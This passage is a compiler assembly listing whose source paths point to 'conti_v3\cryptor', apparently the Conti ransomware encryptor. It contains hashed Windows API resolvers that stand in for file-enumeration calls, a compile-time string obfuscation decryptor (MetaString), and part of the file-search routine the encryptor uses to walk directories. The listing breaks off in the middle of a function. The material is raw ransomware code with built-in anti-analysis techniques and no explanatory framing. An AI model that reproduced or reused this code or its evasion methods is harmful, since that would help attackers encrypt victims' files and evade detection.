	DD	imagerel $unwind$??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z DD 050b01H
	DD	0e007620bH
	DD	07003d005H
	DD	06002H
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Swap_proxy_and_iterators@_Container_base0@std@@QEAAXAEAU12@@Z
_TEXT	SEGMENT
this$dead$ = 8
__formal$dead$ = 16
?_Swap_proxy_and_iterators@_Container_base0@std@@QEAAXAEAU12@@Z PROC ; std::_Container_base0::_Swap_proxy_and_iterators, COMDAT

; 1177 :     _CONSTEXPR20 void _Swap_proxy_and_iterators(_Container_base0&) noexcept {}

  00000	c2 00 00	 ret	 0
?_Swap_proxy_and_iterators@_Container_base0@std@@QEAAXAEAU12@@Z ENDP ; std::_Container_base0::_Swap_proxy_and_iterators
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z
_TEXT	SEGMENT
this$ = 8
__formal$dead$ = 16
__formal$dead$ = 24
??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z PROC ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl, COMDAT

; 1442 :     _CONSTEXPR20 _Fake_proxy_ptr_impl(const _Fake_allocator&, const _Container_base0&) noexcept {}

  00000	48 8b c1	 mov	 rax, rcx
  00003	c3		 ret	 0
??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z ENDP ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ
_TEXT	SEGMENT
this$dead$ = 8
?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ PROC	; std::_Fake_proxy_ptr_impl::_Release, COMDAT

; 1445 :     _CONSTEXPR20 void _Release() noexcept {}

  00000	c2 00 00	 ret	 0
?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ ENDP	; std::_Fake_proxy_ptr_impl::_Release
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pFindFirstFileW@@YAPEAXPEB_WPEAU_WIN32_FIND_DATAW@@@Z
_TEXT	SEGMENT
lpFileName$ = 48
lpFindFileData$ = 56
?pFindFirstFileW@@YAPEAXPEB_WPEAU_WIN32_FIND_DATAW@@@Z PROC ; pFindFirstFileW, COMDAT

; 522  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0000a	48 8b da	 mov	 rbx, rdx

; 523  : 	HANDLE(WINAPI * pFunction)(LPCWSTR, LPWIN32_FIND_DATAW);
; 524  : 	pFunction = (HANDLE(WINAPI*)(LPCWSTR, LPWIN32_FIND_DATAW))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x4796a6c5, 63);//GetProcAddress(hKernel32, OBFA("FindFirstFileW"));

  0000d	41 b8 c5 a6 96
	47		 mov	 r8d, 1201055429		; 4796a6c5H
  00013	ba 0f 00 00 00	 mov	 edx, 15
  00018	48 8b f9	 mov	 rdi, rcx
  0001b	44 8d 4a 30	 lea	 r9d, QWORD PTR [rdx+48]
  0001f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 525  : 	return pFunction(lpFileName, lpFindFileData);

  00024	48 8b d3	 mov	 rdx, rbx
  00027	48 8b cf	 mov	 rcx, rdi

; 526  : }

  0002a	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  0002f	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00033	5f		 pop	 rdi

; 525  : 	return pFunction(lpFileName, lpFindFileData);

  00034	48 ff e0	 rex_jmp rax
?pFindFirstFileW@@YAPEAXPEB_WPEAU_WIN32_FIND_DATAW@@@Z ENDP ; pFindFirstFileW
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pFindNextFileW@@YAHPEAXPEAU_WIN32_FIND_DATAW@@@Z
_TEXT	SEGMENT
hFindFile$ = 48
lpFindFileData$ = 56
?pFindNextFileW@@YAHPEAXPEAU_WIN32_FIND_DATAW@@@Z PROC	; pFindNextFileW, COMDAT

; 532  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0000a	48 8b da	 mov	 rbx, rdx

; 533  : 	BOOL(WINAPI * pFunction)(HANDLE, LPWIN32_FIND_DATAW);
; 534  : 	pFunction = (BOOL(WINAPI*)(HANDLE, LPWIN32_FIND_DATAW))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xff036af1, 62);//GetProcAddress(hKernel32, OBFA("FindNextFileW"));

  0000d	41 b8 f1 6a 03
	ff		 mov	 r8d, -16553231		; ff036af1H
  00013	ba 0f 00 00 00	 mov	 edx, 15
  00018	48 8b f9	 mov	 rdi, rcx
  0001b	44 8d 4a 2f	 lea	 r9d, QWORD PTR [rdx+47]
  0001f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 535  : 	return pFunction(hFindFile, lpFindFileData);

  00024	48 8b d3	 mov	 rdx, rbx
  00027	48 8b cf	 mov	 rcx, rdi

; 536  : }

  0002a	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  0002f	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00033	5f		 pop	 rdi

; 535  : 	return pFunction(hFindFile, lpFindFileData);

  00034	48 ff e0	 rex_jmp rax
?pFindNextFileW@@YAHPEAXPEAU_WIN32_FIND_DATAW@@@Z ENDP	; pFindNextFileW
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pFindClose@@YAHPEAX@Z
_TEXT	SEGMENT
hFindFile$ = 48
?pFindClose@@YAHPEAX@Z PROC				; pFindClose, COMDAT

; 541  : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 542  : 	BOOL(WINAPI * pFunction)(HANDLE);
; 543  : 	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x013ee65d, 61);//GetProcAddress(hKernel32, OBFA("FindClose"));

  00006	ba 0f 00 00 00	 mov	 edx, 15
  0000b	41 b8 5d e6 3e
	01		 mov	 r8d, 20899421		; 013ee65dH
  00011	48 8b d9	 mov	 rbx, rcx
  00014	44 8d 4a 2e	 lea	 r9d, QWORD PTR [rdx+46]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 544  : 	return pFunction(hFindFile);

  0001d	48 8b cb	 mov	 rcx, rbx

; 545  : }

  00020	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00024	5b		 pop	 rbx

; 544  : 	return pFunction(hFindFile);

  00025	48 ff e0	 rex_jmp rax
?pFindClose@@YAHPEAX@Z ENDP				; pFindClose
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?plstrcmpW@@YAHPEB_W0@Z
_TEXT	SEGMENT
lpString1$ = 48
lpString2$ = 56
?plstrcmpW@@YAHPEB_W0@Z PROC				; plstrcmpW, COMDAT

; 551  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0000a	48 8b da	 mov	 rbx, rdx

; 552  : 	int(WINAPI * pFunction)(LPCWSTR, LPCWSTR);
; 553  : 	pFunction = (int(WINAPI*)(LPCWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd76d434b, 60);//GetProcAddress(hKernel32, OBFA("lstrcmpW"));

  0000d	41 b8 4b 43 6d
	d7		 mov	 r8d, -680705205		; d76d434bH
  00013	ba 0f 00 00 00	 mov	 edx, 15
  00018	48 8b f9	 mov	 rdi, rcx
  0001b	44 8d 4a 2d	 lea	 r9d, QWORD PTR [rdx+45]
  0001f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 554  : 	return pFunction(lpString1, lpString2);

  00024	48 8b d3	 mov	 rdx, rbx
  00027	48 8b cf	 mov	 rcx, rdi

; 555  : }

  0002a	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  0002f	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00033	5f		 pop	 rdi

; 554  : 	return pFunction(lpString1, lpString2);

  00034	48 ff e0	 rex_jmp rax
?plstrcmpW@@YAHPEB_W0@Z ENDP				; plstrcmpW
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
;	COMDAT ?MakeSearchMask@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@@Z
_TEXT	SEGMENT
$T2 = 64
$T8 = 72
$T13 = 80
$T7 = 112
__$ReturnUdt$ = 176
Directory$ = 184
?MakeSearchMask@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@@Z PROC ; MakeSearchMask, COMDAT

; 20   : {

$LN229:
  00000	48 89 5c 24 20	 mov	 QWORD PTR [rsp+32], rbx
  00005	55		 push	 rbp
  00006	56		 push	 rsi
  00007	41 56		 push	 r14
  00009	48 8d 6c 24 b9	 lea	 rbp, QWORD PTR [rsp-71]
  0000e	48 81 ec 90 00
	00 00		 sub	 rsp, 144		; 00000090H
  00015	45 33 f6	 xor	 r14d, r14d
  00018	48 8b f1	 mov	 rsi, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

  0001b	48 83 7a 18 07	 cmp	 QWORD PTR [rdx+24], 7
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 20   : {

  00020	48 8b da	 mov	 rbx, rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2226 :         value_type* _Result = _Bx._Buf;

  00023	48 8b ca	 mov	 rcx, rdx

; 2227 :         if (_Large_mode_engaged()) {

  00026	76 03		 jbe	 SHORT $LN201@MakeSearch

; 2228 :             _Result = _Unfancy(_Bx._Ptr);

  00028	48 8b 0a	 mov	 rcx, QWORD PTR [rdx]
$LN201@MakeSearch:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 21   : 	WCHAR t = Directory[Directory.length() - 1];

  0002b	48 8b 42 10	 mov	 rax, QWORD PTR [rdx+16]
  0002f	48 89 bc 24 c0
	00 00 00	 mov	 QWORD PTR [rsp+192], rdi

; 22   : 	std::wstring SearchMask = t == L'\\' ? Directory + OBFW(L"*") : Directory + OBFW(L"\\*");

  00037	66 83 7c 41 fe
	5c		 cmp	 WORD PTR [rcx+rax*2-2], 92 ; 0000005cH
  0003d	0f 85 eb 00 00
	00		 jne	 $LN3@MakeSearch
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00043	44 88 75 f7	 mov	 BYTE PTR $T2[rbp-73], r14b
  00047	c6 45 f8 77	 mov	 BYTE PTR $T2[rbp-72], 119 ; 00000077H
  0004b	c6 45 f9 71	 mov	 BYTE PTR $T2[rbp-71], 113 ; 00000071H
  0004f	c6 45 fa 71	 mov	 BYTE PTR $T2[rbp-70], 113 ; 00000071H
  00053	c6 45 fb 71	 mov	 BYTE PTR $T2[rbp-69], 113 ; 00000071H
  00057	0f b6 45 f8	 movzx	 eax, BYTE PTR $T2[rbp-72]

; 58   :         return m_isDecrypted;

  0005b	0f b6 45 f7	 movzx	 eax, BYTE PTR $T2[rbp-73]

; 63   :         if (!isDecrypted())

  0005f	84 c0		 test	 al, al
  00061	75 62		 jne	 SHORT $LN26@MakeSearch

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00063	4d 8b ce	 mov	 r9, r14
  00066	66 66 0f 1f 84
	00 00 00 00 00	 npad	 10
$LL27@MakeSearch:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00070	42 0f b6 4c 0d
	f8		 movzx	 ecx, BYTE PTR $T2[rbp+r9-72]

; 40   :     return (a % n + n) % n;

  00076	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0007b	83 e9 71	 sub	 ecx, 113		; 00000071H
  0007e	44 6b c1 07	 imul	 r8d, ecx, 7

; 40   :     return (a % n + n) % n;

  00082	41 f7 e8	 imul	 r8d
  00085	41 03 d0	 add	 edx, r8d
  00088	c1 fa 06	 sar	 edx, 6
  0008b	8b c2		 mov	 eax, edx
  0008d	c1 e8 1f	 shr	 eax, 31
  00090	03 d0		 add	 edx, eax
  00092	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00095	44 2b c0	 sub	 r8d, eax
  00098	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0009d	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  000a1	41 f7 e8	 imul	 r8d
  000a4	41 03 d0	 add	 edx, r8d
  000a7	c1 fa 06	 sar	 edx, 6
  000aa	8b c2		 mov	 eax, edx
  000ac	c1 e8 1f	 shr	 eax, 31
  000af	03 d0		 add	 edx, eax
  000b1	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  000b4	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  000b7	46 88 44 0d f8	 mov	 BYTE PTR $T2[rbp+r9-72], r8b
  000bc	49 ff c1	 inc	 r9
  000bf	49 83 f9 04	 cmp	 r9, 4
  000c3	72 ab		 jb	 SHORT $LL27@MakeSearch
$LN26@MakeSearch:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 4970 :     const auto _Left_size  = _Left.size();

  000c5	48 8b 53 10	 mov	 rdx, QWORD PTR [rbx+16]

; 264  :         return _CSTD wcslen(reinterpret_cast<const wchar_t*>(_First));

  000c9	48 8d 4d f8	 lea	 rcx, QWORD PTR $T2[rbp-72]
  000cd	48 c7 c0 ff ff
	ff ff		 mov	 rax, -1
$LL207@MakeSearch:
  000d4	48 ff c0	 inc	 rax
  000d7	66 44 39 34 41	 cmp	 WORD PTR [rcx+rax*2], r14w
  000dc	75 f6		 jne	 SHORT $LL207@MakeSearch

; 4972 :     if (_Left.max_size() - _Left_size < _Right_size) {

  000de	48 b9 fe ff ff
	ff ff ff ff 7f	 mov	 rcx, 9223372036854775806 ; 7ffffffffffffffeH
  000e8	48 2b ca	 sub	 rcx, rdx
  000eb	48 3b c8	 cmp	 rcx, rax
  000ee	0f 82 2d 02 00
	00		 jb	 $LN204@MakeSearch

; 2244 :         return _Myres > _Small_string_capacity;

  000f4	48 83 7b 18 07	 cmp	 QWORD PTR [rbx+24], 7

; 2235 :         const value_type* _Result = _Bx._Buf;

  000f9	4c 8b cb	 mov	 r9, rbx

; 2236 :         if (_Large_mode_engaged()) {

  000fc	76 03		 jbe	 SHORT $LN202@MakeSearch

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

  000fe	4c 8b 0b	 mov	 r9, QWORD PTR [rbx]
$LN202@MakeSearch:

; 4976 :     return {_String_constructor_concat_tag{}, _Left, _Left.c_str(), _Left_size, _Right, _Right_size};

  00101	48 89 44 24 30	 mov	 QWORD PTR [rsp+48], rax
  00106	48 8d 4d 27	 lea	 rcx, QWORD PTR $T7[rbp-73]
  0010a	48 8d 45 f8	 lea	 rax, QWORD PTR $T2[rbp-72]
  0010e	48 89 44 24 28	 mov	 QWORD PTR [rsp+40], rax
  00113	48 89 54 24 20	 mov	 QWORD PTR [rsp+32], rdx
  00118	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  0011d	48 8d 45 27	 lea	 rax, QWORD PTR $T7[rbp-73]
  00121	41 8b ce	 mov	 ecx, r14d
  00124	bf 01 00 00 00	 mov	 edi, 1

; 4977 : }

  00129	e9 e7 00 00 00	 jmp	 $LN77@MakeSearch
$LN3@MakeSearch:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0012e	44 88 75 ff	 mov	 BYTE PTR $T8[rbp-73], r14b
  00132	c6 45 00 20	 mov	 BYTE PTR $T8[rbp-72], 32 ; 00000020H
  00136	c6 45 01 0a	 mov	 BYTE PTR $T8[rbp-71], 10
  0013a	c6 45 02 09	 mov	 BYTE PTR $T8[rbp-70], 9
  0013e	c6 45 03 0a	 mov	 BYTE PTR $T8[rbp-69], 10
  00142	c6 45 04 0a	 mov	 BYTE PTR $T8[rbp-68], 10
  00146	c6 45 05 0a	 mov	 BYTE PTR $T8[rbp-67], 10
  0014a	0f b6 45 00	 movzx	 eax, BYTE PTR $T8[rbp-72]

; 58   :         return m_isDecrypted;

  0014e	0f b6 45 ff	 movzx	 eax, BYTE PTR $T8[rbp-73]

; 63   :         if (!isDecrypted())

  00152	84 c0		 test	 al, al
  00154	75 5b		 jne	 SHORT $LN65@MakeSearch

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00156	4d 8b c6	 mov	 r8, r14
  00159	0f 1f 80 00 00
	00 00		 npad	 7
$LL66@MakeSearch:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00160	42 0f b6 4c 05
	00		 movzx	 ecx, BYTE PTR $T8[rbp+r8-72]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00166	b8 0a 00 00 00	 mov	 eax, 10
  0016b	2b c1		 sub	 eax, ecx
  0016d	6b c8 2a	 imul	 ecx, eax, 42		; 0000002aH

; 40   :     return (a % n + n) % n;

  00170	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00175	f7 e9		 imul	 ecx
  00177	03 d1		 add	 edx, ecx
  00179	c1 fa 06	 sar	 edx, 6
  0017c	8b c2		 mov	 eax, edx
  0017e	c1 e8 1f	 shr	 eax, 31
  00181	03 d0		 add	 edx, eax
  00183	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00186	2b c8		 sub	 ecx, eax
  00188	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0018d	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00190	f7 e9		 imul	 ecx
  00192	03 d1		 add	 edx, ecx
  00194	c1 fa 06	 sar	 edx, 6
  00197	8b c2		 mov	 eax, edx
  00199	c1 e8 1f	 shr	 eax, 31
  0019c	03 d0		 add	 edx, eax
  0019e	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  001a1	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  001a3	42 88 4c 05 00	 mov	 BYTE PTR $T8[rbp+r8-72], cl
  001a8	49 ff c0	 inc	 r8
  001ab	49 83 f8 06	 cmp	 r8, 6
  001af	72 af		 jb	 SHORT $LL66@MakeSearch
$LN65@MakeSearch:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 4970 :     const auto _Left_size  = _Left.size();

  001b1	48 8b 53 10	 mov	 rdx, QWORD PTR [rbx+16]

; 264  :         return _CSTD wcslen(reinterpret_cast<const wchar_t*>(_First));

  001b5	48 8d 4d 00	 lea	 rcx, QWORD PTR $T8[rbp-72]
  001b9	48 c7 c0 ff ff
	ff ff		 mov	 rax, -1
$LL206@MakeSearch:
  001c0	48 ff c0	 inc	 rax
  001c3	66 44 39 34 41	 cmp	 WORD PTR [rcx+rax*2], r14w
  001c8	75 f6		 jne	 SHORT $LL206@MakeSearch

; 4972 :     if (_Left.max_size() - _Left_size < _Right_size) {

  001ca	48 b9 fe ff ff
	ff ff ff ff 7f	 mov	 rcx, 9223372036854775806 ; 7ffffffffffffffeH
  001d4	48 2b ca	 sub	 rcx, rdx
  001d7	48 3b c8	 cmp	 rcx, rax
  001da	0f 82 41 01 00
	00		 jb	 $LN204@MakeSearch

; 2244 :         return _Myres > _Small_string_capacity;

  001e0	48 83 7b 18 07	 cmp	 QWORD PTR [rbx+24], 7

; 2235 :         const value_type* _Result = _Bx._Buf;

  001e5	4c 8b cb	 mov	 r9, rbx

; 2236 :         if (_Large_mode_engaged()) {

  001e8	76 03		 jbe	 SHORT $LN203@MakeSearch

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

  001ea	4c 8b 0b	 mov	 r9, QWORD PTR [rbx]
$LN203@MakeSearch:

; 4976 :     return {_String_constructor_concat_tag{}, _Left, _Left.c_str(), _Left_size, _Right, _Right_size};

  001ed	48 89 44 24 30	 mov	 QWORD PTR [rsp+48], rax
  001f2	48 8d 4d 07	 lea	 rcx, QWORD PTR $T13[rbp-73]
  001f6	48 8d 45 00	 lea	 rax, QWORD PTR $T8[rbp-72]
  001fa	48 89 44 24 28	 mov	 QWORD PTR [rsp+40], rax
  001ff	48 89 54 24 20	 mov	 QWORD PTR [rsp+32], rdx
  00204	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  00209	48 8d 45 07	 lea	 rax, QWORD PTR $T13[rbp-73]
  0020d	b9 02 00 00 00	 mov	 ecx, 2
  00212	41 8b fe	 mov	 edi, r14d
$LN77@MakeSearch:

; 3080 :                 _CSTD memcpy(_My_data_mem, _Right_data_mem, _Memcpy_val_size);

  00215	0f 10 00	 movups	 xmm0, XMMWORD PTR [rax]
  00218	0f 10 48 10	 movups	 xmm1, XMMWORD PTR [rax+16]

; 3081 : 
; 3082 :                 _Right_data._Mysize = 0;

  0021c	4c 89 70 10	 mov	 QWORD PTR [rax+16], r14

; 3083 :                 _Right_data._Myres  = _Small_string_capacity;

  00220	48 c7 40 18 07
	00 00 00	 mov	 QWORD PTR [rax+24], 7

; 3084 :                 _Right_data._Activate_SSO_buffer();
; 3085 :                 _Traits::assign(_Right_data._Bx._Buf[0], _Elem());

  00228	66 44 89 30	 mov	 WORD PTR [rax], r14w
  0022c	0f 11 06	 movups	 XMMWORD PTR [rsi], xmm0
  0022f	0f 11 4e 10	 movups	 XMMWORD PTR [rsi+16], xmm1
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 22   : 	std::wstring SearchMask = t == L'\\' ? Directory + OBFW(L"*") : Directory + OBFW(L"\\*");

  00233	85 c9		 test	 ecx, ecx
  00235	74 40		 je	 SHORT $LN127@MakeSearch
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

  00237	48 8b 55 1f	 mov	 rdx, QWORD PTR $T13[rbp-49]
  0023b	48 83 fa 07	 cmp	 rdx, 7

; 4866 :         if (_My_data._Large_mode_engaged()) {

  0023f	76 36		 jbe	 SHORT $LN127@MakeSearch
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  00241	48 8b 4d 07	 mov	 rcx, QWORD PTR $T13[rbp-73]
  00245	48 8d 14 55 02
	00 00 00	 lea	 rdx, QWORD PTR [rdx*2+2]
  0024d	48 8b c1	 mov	 rax, rcx

; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  00250	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  00257	72 19		 jb	 SHORT $LN126@MakeSearch

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  00259	48 8b 49 f8	 mov	 rcx, QWORD PTR [rcx-8]
  0025d	48 83 c2 27	 add	 rdx, 39			; 00000027H
  00261	48 2b c1	 sub	 rax, rcx

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00264	48 83 c0 f8	 add	 rax, -8
  00268	48 83 f8 1f	 cmp	 rax, 31
  0026c	0f 87 b5 00 00
	00		 ja	 $LN181@MakeSearch
$LN126@MakeSearch:

; 268  :         ::operator delete(_Ptr, _Bytes);

  00272	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN127@MakeSearch:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 22   : 	std::wstring SearchMask = t == L'\\' ? Directory + OBFW(L"*") : Directory + OBFW(L"\\*");

  00277	85 ff		 test	 edi, edi
  00279	74 3c		 je	 SHORT $LN156@MakeSearch
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

  0027b	48 8b 55 3f	 mov	 rdx, QWORD PTR $T7[rbp-49]
  0027f	48 83 fa 07	 cmp	 rdx, 7

; 4866 :         if (_My_data._Large_mode_engaged()) {

  00283	76 32		 jbe	 SHORT $LN156@MakeSearch
